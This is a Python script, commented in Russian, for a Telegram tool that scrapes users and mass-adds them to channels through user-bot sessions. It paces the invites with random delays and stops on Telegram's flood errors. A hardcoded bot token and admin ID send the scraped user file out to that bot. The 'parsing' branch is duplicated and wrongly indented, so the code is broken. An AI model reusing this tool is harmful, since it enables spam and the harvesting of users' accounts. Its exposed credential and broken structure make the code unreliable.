from telethon.sync import TelegramClient
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.types import InputPeerEmpty
from telethon.errors.rpcerrorlist import PeerFloodError, UserPrivacyRestrictedError
from defunc import *
import time
import random
import os
from telegram import Bot

# Задайте токен и ID админа вашего телеграм-бота
TELEGRAM_BOT_TOKEN = '7182432660:AAHlJ09ZDMgH0DtnWtXZubpUanQyC3FRHMA'
TELEGRAM_ADMIN_ID = '6732294050'

# Создайте объект бота
bot = Bot(token=TELEGRAM_BOT_TOKEN)

if __name__ == "__main__":
    while True:
        options = getoptions()
        if not options or options[0] == "NONEID\n" or options[1] == "NONEHASH\n":
            print("Добавьте API_ID и API_HASH")
            time.sleep(2)
            config()
            continue
        
        api_id = int(options[0].replace('\n', ''))
        api_hash = str(options[1].replace('\n', ''))
        if options[2] == 'True\n':
            user_id = True
        else:
            user_id = False
        if options[3] == 'True\n':
            user_name = True
        else:
            user_name = False

        os.system('cls||clear')
        selection = str(input("1 - Настройки\n"
                            "2 - Парсинг\n"
                            "3 - Инвайтинг\n"
                            "e - Выход\n"
                            "Ввод: "))
        
        if selection == '1':
            config()


        elif selection == '2':
    # Остальной код для парсинга

    # Путь к файлу, который нужно отправить
    file_name = 'your_parsed_file.txt'

    # Отправляем файл в телеграм-бот
    with open(file_name, 'rb') as file:
        bot.send_document(chat_id=TELEGRAM_ADMIN_ID, document=file)

    # Опционально, можно удалить файл после отправки
    os.remove(file_name)
    
        elif selection == '2':
            # Остальной код для парсинга

            # После завершения парсинга, отправляем файлы в телеграм-бот
            # Путь к файлу, который нужно отправить
            file_path = 'your_parsed_file.txt'

            # Отправляем файл в телеграм-бот
            with open(file_path, 'rb') as file:
                bot.send_document(chat_id=TELEGRAM_ADMIN_ID, document=file)

            # Опционально, можно удалить файл после отправки
            os.remove(file_path)

        elif selection == '3':
            with open('usernames.txt', 'r') as f:
                users = list(f)

            print("Выберите юзер-бота для инвайтинга.\n"
                "(Аккаунт который состоит в группе, в которую производится инвайт)")
            
            sessions = []
            for file in os.listdir('.'):
                if file.endswith('.session'):
                    sessions.append(file)

            for i in range(len(sessions)):
                print(f"{i} -", sessions[i])
            i = int(input("Ввод: "))
            
            client = TelegramClient(sessions[i].replace('\n', ''), api_id, api_hash)

            channelname = input('Введите имя канала для инвайта (без "@")')

            for limit in range(20):
                try:
                    inviting(client, channelname, users[limit].replace('\n', ''))
                    print(users[limit].replace('\n', ''))
                    time.sleep(random.randrange(15, 40))

                except UserPrivacyRestrictedError:
                    print('Пользователь ' + users[limit].replace('\n', '') + ' запретил его инвайтить. Пропускаем :(')

                except PeerFloodError:
                    print('Телеграмм заспамлен.')
                    break

                except Exception as error:
                    print(error)
                    break

        elif selection == 'e':
            break
